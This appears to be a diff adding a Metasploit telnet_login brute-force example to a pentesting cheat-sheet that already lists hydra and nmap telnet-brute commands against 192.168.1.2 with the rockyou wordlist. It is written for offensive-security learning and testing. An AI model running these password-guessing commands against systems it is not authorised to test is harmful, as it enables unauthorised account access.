@@ -74,6 +74,15 @@ If you got a **`username`** and need the **`password`** this is the way.
 hydra -t 1 -l user -P rockyou.txt telnet://192.168.1.2 -V -F -I
 nmap -p23 --script="telnet-brute" --script-args="user=john,passdb=rockyou.txt,telnet-brute.timeout=8s" 192.168.1.2
 ```
+```bash
+msf6 > use auxiliary/scanner/telnet/telnet_login 
+msf6 auxiliary(scanner/telnet/telnet_login) > set RHOSTS 192.168.1.2
+msf6 auxiliary(scanner/telnet/telnet_login) > set USERNAME peter
+msf6 auxiliary(scanner/telnet/telnet_login) > set PASS_FILE rockyou.txt
+msf6 auxiliary(scanner/telnet/telnet_login) > set THREADS 1
+msf6 auxiliary(scanner/telnet/telnet_login) > set STOP_ON_SUCCESS true
+msf6 auxiliary(scanner/telnet/telnet_login) > run
+```
 
 #### Username
 
